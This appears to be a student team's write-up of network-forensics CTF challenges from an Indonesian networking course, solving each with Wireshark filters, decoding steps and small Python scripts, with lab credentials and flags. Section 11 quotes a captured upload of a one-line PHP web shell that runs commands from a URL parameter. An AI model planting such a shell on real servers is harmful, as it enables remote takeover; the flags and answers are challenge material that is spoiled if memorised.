# Jarkom-Modul-1-IT12-2024

## Kelompok IT12
### Anggota Kelompok :
|             Nama              |     NRP    |
|-------------------------------|------------|
| Azza Farichi Tjahjono         | 5027231071 |
| Aisyah Rahmasari              | 5027231072 |


 
## 1. Advance Sanity Check

## Langkah - langkah :
1. Masukkan IP yang tersedia di pertanyaan Advance Sanity Check yaitu : 10.15.42.60 44000
2. Untuk mengetahui username, buka paket nomor 85 di Wireshark dan lihat di bagian bawah jendela untuk menemukan data yang berisi username yaitu : JaneD03
3. Untuk mengetahui nama file yang dikirim, buka paket nomor 85 di Wireshark dan periksa bagian File Name dalam detail paket tersebut. Nama file yang dikirim akan tercantum, yaitu : Clue3.txt
4. Untuk mendapatkan pesan rahasia, ikuti petunjuk yang tertera pada salah satu paket yang ada, yang menyebutkan peraturan soal shift. Anda dapat menemukan detail tersebut pada file soal shift di https://jarkomprak2024.carrd.co/, yaitu : cGVud29yZA==
5. Dari kode yang diperoleh, decode kata yang ditandai dengan warna merah menjadi string. Setelah proses decoding, hasilnya adalah kata "penword".
6. Flag :
   ```
   Benar! Ini flag-mu: JarkomIT{8uK4n_S4n1ty_b1a5A_k5fLrjgf2KeSio8hPTpRgMmbjSu5ymVutby5BDVDDGYUFpSEsakP0IKK}
   ```

Berikut bukti dokumentasinya :

1. ![Screenshot 2024-09-19 002809](https://github.com/user-attachments/assets/d038044b-92e3-4c80-b623-d704a570cd6c)

2. ![Screenshot 2024-09-19 003055](https://github.com/user-attachments/assets/87776c1d-452b-4e09-8941-7c1b5866c474)

3. ![Screenshot 2024-09-19 003140](https://github.com/user-attachments/assets/2d116131-8a4c-438f-a54e-2f94cf23fb7e)

4. ![Screenshot 2024-09-19 003147](https://github.com/user-attachments/assets/fd4b66be-80a0-46d4-987c-ee73fca8734d)



## 2. Pegawai Negeri Sebelah

## Langkah - langkah : 
1.  Masukkan IP yang tersedia di pertanyaan Pegawai Negeri Sebelah, yaitu : 10.15.42.60 53000
2.  Untuk menemukan pemilik password "nNnM%coQuF", gunakan filter tcp.stream eq di Wireshark. Terapkan filter tersebut dan telusuri paket-paket yang ada hingga menemukan informasi terkait password. Hasilnya menunjukkan bahwa pemilik password tersebut adalah Vero Tampubolon.
3.  Kemudian, diminta untuk menentukan jabatan Taufan Kuswandari, yang tercatat sebagai Analis Kebijakan.
4.  Selanjutnya, untuk nama yang terdaftar di posisi teratas, yaitu Cici Mustofa, serta password untuk pengguna terakhir, Harjasa Suryatmi, yang memiliki password "RyxaJPv^yF".
5. Flag :
   ```
   Benar! Ini flag-mu: JarkomIT{Tum8eN_p45SnYa_Ku4t_B1aS4Nya_RE5fB9msos1r1n1tSfPEjZ0NBL3FW15zhfirMVzotJtTjtmg1WeEM4h}
   ```

Berikut bukti dokumentasinya : 

1. ![Screenshot 2024-09-18 233950](https://github.com/user-attachments/assets/46748b38-8555-4008-b217-78542ddfb7fe)
   
2. ![Screenshot 2024-09-18 234046](https://github.com/user-attachments/assets/27b0b312-631d-4097-826e-11de24e991b8)
   
3. ![Screenshot 2024-09-18 203831](https://github.com/user-attachments/assets/cfce1876-3bcc-43a2-aa7d-94e503247503)
   
4. ![Screenshot 2024-09-18 203255](https://github.com/user-attachments/assets/d2bbc310-6a67-4876-8070-8de6080854bf)
   
   ![Screenshot 2024-09-18 203848](https://github.com/user-attachments/assets/6bb29f1e-9467-4bf9-accc-0bf2df0e88e9)

   ![Screenshot 2024-09-18 203929](https://github.com/user-attachments/assets/9289e086-595b-4902-9fed-8dafcd978f34)

   ![Screenshot 2024-09-18 203953](https://github.com/user-attachments/assets/58b19cec-b16d-4970-bb95-a8661593eeee)


## 3. FTP LOGIN

## Langkah - langkah : 
1.  Masukkan IP yang tersedia di pertanyaan FTP LOGIN, yaitu :  10.15.42.60 49000
2.  Selanjutnya, ketika membuka file di Wireshark, mayoritas paket yang berkaitan dengan login teridentifikasi pada protokol FTP. Untuk mempermudah pencarian, filter dengan kata kunci "ftp" dan pilih paket yang menunjukkan informasi login berhasil.
3.  Pada terminal, kami diminta untuk memasukkan username yang berhasil digunakan untuk login FTP. Setelah menganalisis data, kami menemukan bahwa username yang berhasil login adalah sn34ky. Selanjutnya, kami juga diminta untuk memberikan password untuk username tersebut, yang adalah sup3rsn1ff3r.
4. Flag :
   ```
   Benar! Ini flag-mu: JarkomIT{n0t_s0_s3cur3_ftp_V20h8MV4kLHzIDl4vM8bxqWbvL0XwLEJuZEjtqRrHk2Wf44U4ObVG1N}
   ```

Berikut bukti dokumentasinya :

1. ![Screenshot 2024-09-18 235718](https://github.com/user-attachments/assets/7ad3c3cf-7956-42d6-9286-3682bcf9828b)

2. ![Screenshot 2024-09-18 235738](https://github.com/user-attachments/assets/f3dc561b-2497-4ced-b797-383c7f02d318)

3. ![Screenshot 2024-09-18 235755](https://github.com/user-attachments/assets/7904942b-a3b5-41d1-9fe1-b0fc2c9a9005)


## 4. SUPRISE

## Langkah - langkah : 
1.  Masukkan IP yang tersedia di pertanyaan SUPRISE, yaitu : 10.15.42.60 48500
2.  Di terminal, Anda diminta untuk memasukkan layanan yang digunakan pada FTP. Untuk ini, cari paket yang relevan dengan format yang sama seperti pada soal FTP Login sebelumnya.
3.  Setelah menemukan baris yang sesuai, masukkan informasi tersebut dan berhasil.
4.  Kemudian, diminta untuk mengirim nama file yang dikirim oleh penyerang. Temukan nama file di paket yang sama, masukkan kata dengan format yang benar, dan verifikasi keberhasilannya.
5.  Selanjutnya, cari pesan rahasia dari penyerang. Telusuri paket dari atas ke bawah hingga menemukan paket dengan informasi yang sama seperti nama file sebelumnya.
6.  Paket tersebut berisi kode C++ yang dikompilasi untuk menemukan hasil tertentu. Masukkan hasil ini ke terminal untuk mendapatkan jawaban yang benar.
7. Flag :
   ```
   Benar! Ini flag-mu: JarkomIT{l1ttl3_m0us3_1n_th3_h0us3_nfiQRSf2p6F4uj4coKFqxHJX0G0UM0MTQFSJynM3gooJAbMxhjhXTCHU}
   ```

Berikut bukti dokumentasinya : 

1. ![Screenshot 2024-09-18 205056](https://github.com/user-attachments/assets/c8c1cfaa-de21-4881-a893-caa3fe3535cd)

2. ![Screenshot 2024-09-18 205128](https://github.com/user-attachments/assets/c4502453-0f97-4ac9-be57-0184c55cb3f6)

3. ![Screenshot 2024-09-18 205135](https://github.com/user-attachments/assets/04beb9c6-b872-4045-b696-25045ef70fdf)

4. ![Screenshot 2024-09-19 015114](https://github.com/user-attachments/assets/79ff9eb0-6eee-4f61-aa48-cda20487b9db)



## 5. PACKAGE BARRAGE

## Langkah - langkah : 
1.  Masukkan IP yang tersedia di pertanyaan  PACKAGE BARRAGE, yaitu : 10.15.42.60 47000
2.  Untuk menemukan informasi tentang penyerang, pertama-tama kami mengidentifikasi IP address penyerang, yang tercatat sebagai 172.21.80.1.
3.  Selain itu, kami menganalisis data untuk menghitung total upaya brute-force yang dilakukan oleh penyerang, yang ternyata mencapai 1917. Penemuan ini didasarkan pada analisis file dan data yang terdeteksi pada percobaan ke-1917 dan ke-1918, di mana kami menemukan file yang terkait dengan upaya brute-force tersebut.
4.  Setelah berhasil login, penyerang mengunduh file dengan nama "Albatros.txt". Konten yang disisipkan oleh penyerang dalam file tersebut adalah "Der Rote Kampfflieger", yang sesuai dengan informasi yang tersedia.
5.  Flag :
   ```
   Benar! Ini flag-mu: JarkomIT{th3_fly1ng_c1rcus_0f_w4r_g7CLgMtr0z8sD4L7XrFge7aOY5StghkJi38YyG3yVcceSrWurX7UUACE}
   ```

Berikut hasil dokumentasinya :

1. ![Screenshot 2024-09-19 015541](https://github.com/user-attachments/assets/22a1cec0-1880-4c03-b5d3-400b251e2c23)

2. ![Screenshot 2024-09-18 215137](https://github.com/user-attachments/assets/f27995ba-5a58-4e15-87ec-6ac3752bb03d)

3. ![Screenshot 2024-09-18 215231](https://github.com/user-attachments/assets/2bc3ba8c-2bd4-480f-a255-f329a044d38d)

4. ![Screenshot 2024-09-18 215715](https://github.com/user-attachments/assets/101d3319-cfc1-42b6-a1c6-1a8fcd887979)

5. ![Screenshot 2024-09-18 215727](https://github.com/user-attachments/assets/1c7721c4-4b27-470c-b181-69bacb1dfd22)
   


## 6. Gajah Terbang (Server Recon)

## Langkah - langkah : 
1.  Masukkan IP yang tersedia di pertanyaan Gajah Terbang (Server Recon), yaitu :  10.15.42.60 61000
2.  Pertanyaan pertama terkait DBMS yang digunakan pada server, dan setelah menganalisis file pcap, diketahui bahwa server tersebut menggunakan PostgreSQL sebagai sistem manajemen basis datanya.
3.  Selanjutnya, setelah menganalisis secara detail, saya menemukan pada paket dengan panjang 560 terdapat informasi mengenai server Debian. Berdasarkan temuan ini, saya menyimpulkan bahwa port tersebut digunakan oleh server DBMS, sesuai dengan pertanyaan mengenai port tempat server berjalan.
4.  Setelah memeriksa lebih lanjut, saya mengonfirmasi bahwa sistem operasi yang digunakan untuk server tersebut adalah Debian, sesuai dengan informasi yang sebelumnya ditemukan.
5.  Setelah meneliti lebih lanjut, kita menemukan bahwa username valid untuk DBMS adalah "s1gm4". Nama database yang digunakan adalah "sigmaskibidigyatrizzzz". Dalam database tersebut, terdapat empat pengguna, yaitu Kevin, Jojo, Siska, dan Kuntoaji. Email admin yang terdaftar adalah "jojohermawan@gmail.com". Password yang digunakan oleh admin adalah "admin1234", yang kemudian di-hash untuk mengetahui nilai aslinya.
6. Flag :
    ```
    Benar! Ini flag-mu: JarkomIT{Gy4tT_M5g_4U_8usPMgdhbwU0oEB8fBTStBxFG5k1tk5xxJJAlP4O8qwV7HvatHUkgBiD1}
    ```

    
Berikut adalah bukti dokumentasinya :

1. ![Screenshot 2024-09-18 225703](https://github.com/user-attachments/assets/e770b427-4847-45af-88dc-1e5065cae87a)

2. ![Screenshot 2024-09-18 225845](https://github.com/user-attachments/assets/90f9dd4e-3506-45ab-aca5-3c32e034700d)

3. ![Screenshot 2024-09-18 225928](https://github.com/user-attachments/assets/468182dc-10aa-42af-9bd5-4b12b5abe29d)

4. ![Screenshot 2024-09-18 225957](https://github.com/user-attachments/assets/bffc5ba0-7820-4134-a7dd-86b1b45021df)

5. ![Screenshot 2024-09-18 230042](https://github.com/user-attachments/assets/ef3e9f4b-3332-4f2f-a799-6e3084c46ea6)

6. ![Screenshot 2024-09-18 230112](https://github.com/user-attachments/assets/14b9575a-9123-44f7-9542-53015a48ed20)

7. ![Screenshot 2024-09-18 230134](https://github.com/user-attachments/assets/95c0d3f0-3e11-474e-af5c-2ac531643a2c)

8. ![Screenshot 2024-09-18 230406](https://github.com/user-attachments/assets/37ccd547-5323-40e3-80ae-2f83dc8ae6ad)

9. ![Screenshot 2024-09-18 230418](https://github.com/user-attachments/assets/984ab0cf-5f4d-437e-bec1-058accfa30e2)


## 7. Gajah Terbang (Attacker Recon)

## Langkah - langkah : 
1.  Masukkan IP yang tersedia di pertanyaan Gajah Terbang (Attacker Recon), yaitu :
2.  Akun yang dimiliki oleh penyerang dalam database adalah kuntoajiisrillll@gmail.com. Untuk menemukan informasi ini, saya menganalisis data yang tersedia dan mengidentifikasi bahwa kuntoaji memiliki peran yang mencurigakan di server, yaitu sebagai penyerang yang mengubah peran pengguna.
3.  Password yang digunakan oleh penyerang adalah "kissme". Lalu memverifikasi password ini dengan mencocokkannya melalui proses hashing untuk mendapatkan password yang sesungguhnya.
4.  Tanggal pemblokiran akun penyerang tercatat pada 2024-06-09. Informasi ini diperoleh dengan melihat ID pengguna, yang menunjukkan bahwa akun kuntoaji, dengan ID 3, diblokir pada tanggal tersebut.
5.  Penyerang memodifikasi dua tabel dalam database, yaitu "users" dan "banned_users". Modifikasi ini dapat dilihat dari perubahan yang terjadi pada data di tabel-tabel tersebut.
6.  Barang-barang yang dibeli oleh penyerang meliputi "rokok" dan "es krim". Total transaksi untuk barang-barang ini, berdasarkan data yang ada, adalah 24,500. Informasi ini dihitung dari harga masing-masing barang dan jumlah transaksi yang tercatat.
7. Flag :
    ```
    Benar! Ini flag-mu: JarkomIT{G4jaH_K0k_t3RbaNG_EiyYfwb1yl3i5IoixQ9MUFuFCYntaCZObw7K7zKGX7zHqe1qaYvP2Kt5}
    ``` 

Berikut hasil dokumentasinya : 

1. ![Screenshot 2024-09-18 231132](https://github.com/user-attachments/assets/dc586d31-c9f5-42d1-85b1-252e4b060ffd)

2. ![Screenshot 2024-09-18 231232](https://github.com/user-attachments/assets/7e02dc26-63bd-4088-9289-203b1db8ef93)

3. ![Screenshot 2024-09-18 231322](https://github.com/user-attachments/assets/e6757c6c-5f11-4290-9ef7-62b71a9ad805)

4. ![Screenshot 2024-09-18 231648](https://github.com/user-attachments/assets/74f20218-c140-4f67-af8f-7c7c8cf0cb19)

5. ![Screenshot 2024-09-18 231930](https://github.com/user-attachments/assets/a2792699-95f7-47ba-9d5a-dabaed704131)

6. ![Screenshot 2024-09-18 232004](https://github.com/user-attachments/assets/c4d80f3b-10b6-44c9-935c-f16b45d13d2f)

7. ![Screenshot 2024-09-18 232004](https://github.com/user-attachments/assets/15813673-7db0-44cd-a2c0-169d2914c5f4)

8. ![Screenshot 2024-09-18 232109](https://github.com/user-attachments/assets/1ee85cdf-9c6f-4763-8863-3281feca6b7f)

9. ![Screenshot 2024-09-18 232115](https://github.com/user-attachments/assets/c0515084-8b50-44cf-b80a-14b92257caab)

    

## 8. Illegal Breakthrough

### Langkah-langkah:
1. Menemukan alamat IP menggunakan Wireshark: 172.21.88.207
2. Menemukan port webserver: 1917
3. Mengidentifikasi endpoint: `/ww1.php`
4. Alat yang digunakan penyerang: Fuzz Faster U Fool v2.1.0-dev (ffuf-v2.1.0-dev)
   
   ![Screenshot from 2024-09-18 19-03-16](https://github.com/user-attachments/assets/291694d5-67ca-4ab9-a4cb-261cc0970617)


6. Menemukan kredensial menggunakan filter:
   `http.response.code == 200 || http.response.code == 302 || http.response.code == 500`
   
    ![Screenshot from 2024-09-18 19-03-25](https://github.com/user-attachments/assets/214680b3-22ba-4f29-8805-cc883573b044)

   

### Kredensial:
- Username: Redbaron
- Password: fly1ng4c3

### Flag:
```
JarkomIT{d34th_fr0m_th3_sky_6EkG8A6TWNe6bIkS0AUnkuTNWH1fCNB1GtDXzjjpstmJrqPESExTWW1}
```

## 9. Corporate Breach

### Langkah-langkah:
1. Menemukan nama penyerang: `frame contains "name"`
2. Menemukan email: `frame contains "%40gmail.com"` (mencari panjang unik: 108)
3. Menemukan password di stream
   
![Screenshot from 2024-09-18 19-49-38](https://github.com/user-attachments/assets/bf7dfa23-50d9-4c81-8095-0860d7ef57a5)


### Kredensial:
- Email: jarkomsupport@gmail.com
- Password: j4rk0mg4c0rbg

### Flag:
```
JarkomIT{supp0rt_k0k_l3m4h_bg_X6k4kpmgiywUAvr6ShP1QVrkNG6n0aJuPNWjvvdOwDqSxEq2R5SvG6}
```

## 10. Tantangan EZ

### Langkah-langkah:
1. Menemukan pesan di TCP stream:
   ```
   pesan: "jawabannya jawaban"
   ```
  ![Screenshot from 2024-09-18 19-58-46](https://github.com/user-attachments/assets/d6257021-46c3-48eb-a327-df16527911d5)
   
2. Port ditemukan di detail paket: 1234 (search-agent)
   `Source Port: search-agent (1234)`


### Flag:
```
JarkomIT{BiAr_aman_Pake_sSh_5F6N9E3iBq6sTSqNYBq5yrHYV3zjgmrbNiBnrjR4R4A7uLpowvayEZ}
```

## 11. InneRCE

### Langkah-langkah:
1. Menggunakan `frame contains "shell"` untuk menemukan konten HTTP
  lalu lihat pada paket dengan status 200 OK, disitu adalah saat penyerang pertama kali berhasil upload file, lalu lihat pada arrival time untuk menjawab nomor 1

    ![image](https://github.com/user-attachments/assets/29bf79fd-af93-4202-b507-3c68eee7c228)

  berikut adalah endpoint yang rentan di tandai dengan berhasilnya penyerang mengupload file:
  ```
    POST /upload.php HTTP/1.1
    Host: 172.24.141.242:8000
    Connection: keep-alive
    Content-Length: 360
    Cache-Control: max-age=0
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
    Origin: http://172.24.141.242:8000
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryam8WSsNDVFbRRfVY
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Referer: http://172.24.141.242:8000/
    Accept-Encoding: gzip, deflate
    Accept-Language: en-US,en;q=0.9
    
    ------WebKitFormBoundaryam8WSsNDVFbRRfVY
    Content-Disposition: form-data; name="fileToUpload"; filename="idzoyyshell.php"
    Content-Type: application/octet-stream
    
    <?php
    
    echo exec($_GET['mintcocscmd']);
    
    ?>
    
    ------WebKitFormBoundaryam8WSsNDVFbRRfVY
    Content-Disposition: form-data; name="submit"
    
    Upload Image
    ------WebKitFormBoundaryam8WSsNDVFbRRfVY--
    HTTP/1.1 200 OK
    Host: 172.24.141.242:8000
    Date: Mon, 16 Sep 2024 06:18:05 GMT
    Connection: close
    X-Powered-By: PHP/8.2.18
    Content-type: text/html; charset=UTF-8
    
    The file idzoyyshell.php has been uploaded.
  ```
3. Menggunakan `frame contains "hostname"` untuk menemukan nama server: server-app
4. Mengidentifikasi nama file: idzoyyshell.php
5. lalu melihat command pertama seperti pada gambar yaitu `whoami`
    ![Screenshot from 2024-09-18 20-58-39](https://github.com/user-attachments/assets/a06d7c95-1306-475b-bb93-a3354e3bfab7)

     
7. Menemukan string pertama dengan filter: `http contains "idzoyy"`
8. Mendekode string base64:
   ```
   echo "cGxzIHJhdGUgc29hbCBpbmkK" | base64 -d
   pls rate soal ini
   ```

### Flag:
```
JarkomIT{P4L1nG_g4mPaNg_An4L1sA_W3b_aTk_k2iyHeiFpFY43wOPrr0onoOYZW4iweS1Jsu3Ngx8x8FCMqQhdDtxeRCE}
```

## 12. Stegography

### Langkah-langkah:
1. Menemukan 13 file PNG menggunakan `frame contains "png"`
2. Mengekspor objek menggunakan File > Export Objects > FTP-data
3. Menjalankan skrip Python yang dimodifikasi untuk mendekode gambar, berikut adalah modifikasi script python saya
   ```python
    import os
    from PIL import Image
    import glob
    
    def decode_image_reversed(image_path):
        img = Image.open(image_path)
        img = img.convert("RGB")
        pixels = img.load()
    
        binary_message = ""
        for i in range(img.width):
            for j in range(img.height):
                r, g, b = pixels[i, j]
                
                r_bin = format(r, '08b')
                binary_message += r_bin[-1]
    
        message = ""
        for i in range(0, len(binary_message), 8):
            byte = binary_message[i:i + 8]
            char = chr(int(byte, 2))
            
            if message.endswith("EOF"):
                break
            message += char
    
        message = message.replace("EOF", "")
    
        reversed_message = message[::-1]
        return reversed_message

      # Folder tempat gambar-gambar berada
      image_folder = './extracted_images'
      
      # Scan semua file gambar dengan ekstensi tertentu
      for image_file in glob.glob(os.path.join(image_folder, "*.png")) + glob.glob(os.path.join(image_folder, "*.jpg")):
          print(f"Memproses gambar: {image_file}")
          try:
              decoded_message_reversed = decode_image_reversed(image_file)
              print(f"Pesan terbalik dari {image_file}: {decoded_message_reversed}")
          except Exception as e:
              print(f"Gagal memproses {image_file}: {e}")
   ```
   **Output**
   ```bash
   output:
    Memproses gambar: ./extracted_images/TKTI.png
    Pesan terbalik dari ./extracted_images/TKTI.png: 0
    Memproses gambar: ./extracted_images/SOC.png
    Pesan terbalik dari ./extracted_images/SOC.png: 0
    Memproses gambar: ./extracted_images/KWA.png
    Pesan terbalik dari ./extracted_images/KWA.png: 0
    Memproses gambar: ./extracted_images/ATP.png
    Pesan terbalik dari ./extracted_images/ATP.png: nawalhap
    Memproses gambar: ./extracted_images/AI.png
    Pesan terbalik dari ./extracted_images/AI.png: 0
    Memproses gambar: ./extracted_images/IOT.png
    Pesan terbalik dari ./extracted_images/IOT.png: 0
    Memproses gambar: ./extracted_images/SISOP.png
    Pesan terbalik dari ./extracted_images/SISOP.png: 0
    Memproses gambar: ./extracted_images/TKA.png
    Pesan terbalik dari ./extracted_images/TKA.png: 0
    Memproses gambar: ./extracted_images/SBD.png
    Pesan terbalik dari ./extracted_images/SBD.png: 0
    Memproses gambar: ./extracted_images/KJK.png
    Pesan terbalik dari ./extracted_images/KJK.png: rebis
    Memproses gambar: ./extracted_images/IMK.png
    Pesan terbalik dari ./extracted_images/IMK.png: 0
    Memproses gambar: ./extracted_images/EH.png
    Pesan terbalik dari ./extracted_images/EH.png: nanamaek
    Memproses gambar: ./extracted_images/SOKA.png
    Pesan terbalik dari ./extracted_images/SOKA.png: 0
    
    pesan yang ada = ATP, EH, KJK
   ```
  
5. Menemukan pesan di gambar ATP, EH, dan KJK


### Pesan gabungan:
"pahlawan keamanan siber"

### Flag:
```
JarkomIT{S3LaM4t_p4rA_PahL4WaN_suKliOnlOmpKy2uJMaaghiuIBP5sSIeZZC5MXsLf7NDbwAomaoeQ7hC5}
```
## 13. Rizzset


### Informasi yang ditemukan:
1. Domain: www.its.ac.id
2. IP: 103.94.189.5
3. Saya menggunakan tools untuk generate jarm pada github repo [ini](https://github.com/salesforce/jarm)
   dapat digunakan dengan cara:
   ```bash
   pip install -r requirement.txt

   python3 jarm.py www.its.ac.id
   ```
5. JARM fingerprint:
   ```
   2ad2ad16d2ad2ad22c2ad2ad2ad2ad74aaecca9f9c4a3303863dfee62b241e
   ```

    ![image](https://github.com/user-attachments/assets/0ce8c599-9828-432e-ab30-7629345094ea)


### Flag:
```
JarkomIT{Dn5_C0rR34t10n_V1DMrStMk5RBnEGTtYi1yQ14Ur1zZrz71zUcXIbjtr4XX2GyZIHw8d1T5}
```

## 14. Baby Hengker

### Langkah-Langkah:

1. Awalnya saya menggunakan filter berikut:
   ```
   ((usb.transfer_type == 0x01) && (frame.len == 35)) && !(usb.capdata == 00:00:00:00:00:00:00:00)
   ```
   untuk menampilkan hanya pesan yang ada HID DATA yang mungkin bisa berisi pesan penting

   ![image](https://github.com/user-attachments/assets/55c451bd-7c2c-4229-9ad3-d1cd3dfefdf0)

2. lalu ekstrak nilai **HID DATA** dengan cara capture menjadi file csv, lalu cut semua untuk menyisakan kolom **HID DATA** saja.
   ```
   cat hiddata.csv | cut -d "," -f 7 | cut -d '"' -f 2 | grep -vE "HID DATA" > hexoutput.txt
   ```
4. saya menemukan dan mengedit script python yang bisa konversi HID DATA menjadi text, berikut:
   ```python
   # Mapping kunci ke nama
   newmap = {
       2: "PostFail",
       4: "a",
       5: "b",
       6: "c",
       7: "d",
       8: "e",
       9: "f",
       10: "g",
       11: "h",
       12: "i",
       13: "j",
       14: "k",
       15: "l",
       16: "m",
       17: "n",
       18: "o",
       19: "p",
       20: "q",
       21: "r",
       22: "s",
       23: "t",
       24: "u",
       25: "v",
       26: "w",
       27: "x",
       28: "y",
       29: "z",
       30: "1",
       31: "2",
       32: "3",
       33: "4",
       34: "5",
       35: "6",
       36: "7",
       37: "8",
       38: "9",
       39: "0",
       40: "Enter",
       41: "esc",
       42: "del",
       43: "tab",
       44: "space",
       45: "-",
       47: "[",
       48: "]",
       56: "/",
       57: "CapsLock",
       79: "RightArrow",
       80: "LeftArrow"
   }
   
   # Membaca file dan memproses setiap baris
   with open('cleaned_hexoutput.txt', 'r') as myKeys:
       for line in myKeys:
           bytesArray = bytearray.fromhex(line.strip())
           for byte in bytesArray:
               if byte != 0:
                   keyVal = int(byte)
                   if keyVal in newmap:
                       # Print tanpa new line dan mengganti 'space' dengan ' '
                       if newmap[keyVal] == "space":
                           print(" ", end="")
                       else:
                           print(newmap[keyVal], end="")
                   else:
                       print(f"No map found for this value: {keyVal}")
           print()  # Untuk memastikan setiap baris dipisahkan
   ```

5. Run dan outputnya adalah:
      ```bash
      i
      n
      i
       
      p
      pa
      a
      s
      s
      w
      o
      r
      d
       
      w
      i
      f
      fi
      i
      n
      y
      ya
      a
       
      a
      p
      pa
      a
       
      y
      a
      3
      3/
      3
      ```

      muncul kata **ini password wifinya apa ya?**, tetapi ada kesalahan pada probset jdi yang benarnya adalah **ini passwordnya apa ya?**

   ### Flag:
   ```
   JarkomIT{4ku_p9n_j4d1_h3n9k3r_sEgjwq4XoHsAlCwYsUjd5DKa4Am1KV9VYMJMBLL1Nq8trCygsYwc0HCK}
   ```

   ### Documentation:
   
   ![Screenshot from 2024-09-20 17-10-17](https://github.com/user-attachments/assets/75fa3f42-17eb-4422-98d9-864a9535c12a)


## 15. Adult Hengker
### Langkah-langkah:

1. Pertanyaan pertama adalah apa device yang digunakan, jawabannya bisa kita dapat pada packet bagian `GET DESCRIPTOR Response DEVICE`.
   ada bertulisan "Optical Mouse"

2. Lalu saya menemukan tools yang bisa tracking mouse dari [github](https://github.com/WangYihang/USB-Mouse-Pcap-Visualizer), kemudian saya clone dan gunakan tools tersebut.
   
3.  saat sudah saya run, saya sudah mendapatkan hasil dari pergerakan mouse berikut:

  ![image](https://github.com/user-attachments/assets/2eedebca-d9f1-4307-9c7e-7f21aaa67ae5)

### Flag:
```
JarkomIT{d0n7_wr173_r4nd0m1y_AgRSGE6XuTWUyDWpPQ7Rb43Psm455XAGAaou2p6kez52Xp3Lb6LdiK3v1n}
```

### Documentation

![image](https://github.com/user-attachments/assets/e43b6007-2cf0-45bc-beb8-292319040b31)

## 16. 22 Nightmare
### Langkah-langkah:

1. saya coba gunakan filter `ftp` untuk melihat packet ftp nya, dan menemukan
   `Request: STOR Sh1k4.jpg`

2. Lalu saya coba untuk export data ftp ke local, dan ada 2 yaitu `Sh1k4.jpg` dan `noko.py`.
   berikut adalah isi dari gambar dan file nya:

   **Sh1k4.jpg**

   ![image](https://github.com/user-attachments/assets/ff78cf33-cc01-4fec-a640-2e07acbb6f4e)

   **noko.py**
   ```python
   Import Shika

   Class Noko
       input = int
       key = String
       value = String
       
       input = 001001100011010000100010001000100011101001101110001001110011100001101110000110100011101000111100001011110011111000100001011011100001111000100001001111010011110100100111
       
       key = jpg msg
       
       op xor bit
   ```

3. lalu saya coba untuk decode input yang tampaknya merupakan biner di CyberChef, hasilnya adalah:

   ![image](https://github.com/user-attachments/assets/288247f5-904c-4821-9fe5-12371b733dc0)

### Flag:
   ```
   JarkomIT{Sh1k4n0ko_N0_k05h1tan_DFRzXD2t3qVEf03Jc4H3lIZPU7AnfCur3wR0wigbofUnHCVa9y69aUNU}
   ```

### Documentation

![image](https://github.com/user-attachments/assets/e9be963c-4a58-40b1-8d5f-49021abcb09d)

## 17. Malicious Code

### Langkah-langkah:

1. Menjalankan filter `frame contains ".php" && http.request.method=="GET"` dan jumlahkan packet yang muncul, totalnya adalah 52
2. end-point dapat dilihat di stream saat berhasil login / status 200 OK
   `/index.php`
3. untuk attempt brute force attacker saat berhasil adalah setelah 153 kali mencoba, saya dapat dari `total semua packet - packet setelah attacker berhasil login`
4. setelah itu saya mendapatkan kode aneh seperti ASCII pada stream 221 berikut:
   ```
   9711297321199711411097321029711811111410511632112101109981179711632991049710810810111010310163324010410511011658321151191019711610111441
   ```
   artinya:
   ```
   apa warna favorit pembuat challenge? (hint: sweater)
   ```

   jawaban dari pertanyaan tersebut adalah **merah**

 ### Flag:
 ```
 JarkomIT{s3cr3t_m3ss4ge_fr0m_4uth0r_aH2QVVnBvllb9iEs3kSDIXZTHC0YpRjkytGox5x5LkhEHr4UIjL5L0R}
 ```
 
 ### Documentation
 
 ![image](https://github.com/user-attachments/assets/cac1387a-6e13-44ec-ab56-083f33d8a199)

## 18. Simba
### Langkah-langkah:

1. Pertama terdapat pertanyaan apakah service yang compromise ?
2. Setelah mengetahui service yang diserang, langkah selanjutnya adalah mencari user yang terlibat. Dengan menggunakan filter "user", bisa dilihat daftar pengguna yang terkait. Stream dari salah satu paket kemudian diikuti dan hasilnya seperti berikut ini :

![Screenshot 2024-09-22 201721](https://github.com/user-attachments/assets/8eceb430-dddb-43de-b090-93d41309f494)

3. Dari hasil analisis, ditemukan beberapa user seperti:
   - Administrator
   - Guest
   - krbtgt
   - Freddy Kreuger (fkreuger)
   - Jason Vorhees (jvorhees)
   - Michael Meyers (mmeyers)
   - Charles Ray (cray)

Namun, ada sesuatu yang berbeda dengan user **Michael Meyers (mmeyers)** karena deskripsinya tidak seperti yang lain: "IhavesisterIssues!10". Ini menunjukkan kemungkinan aktivitas mencurigakan pada user ini.

4. Awalnya, diperkirakan ada 10 file yang bocor berdasarkan deskripsi "IhavesisterIssues!10". Namun, hasil tersebut ternyata kurang tepat dan saya menambahkan kelompok pengguna lain dengan akses penting, seperti:
   - Server Operators
   - Backup Operators
   - Domain Admins
   - Enterprise Admins
  
![Screenshot 2024-09-22 201813](https://github.com/user-attachments/assets/be1033f7-0f6d-470b-a1c1-9344ed7c78d6)

![Screenshot 2024-09-22 201833](https://github.com/user-attachments/assets/454cfabf-7d00-4e6b-8786-3deaf64c8d95)

### Flag:
 ```
 Benar! Ini flag-mu: JarkomIT{4PaK4h_M3nD1nG_p4K3_SFTP_5jf1XUx6NhTL8SJxUr96ab3YeAac3tU1tQWUxWw86QzC6qjmLgQeSMB}
 ```

## 19. Encrypted World
### Langkah-langkah:

## 20. Netware
### Langkah-langkah:




   










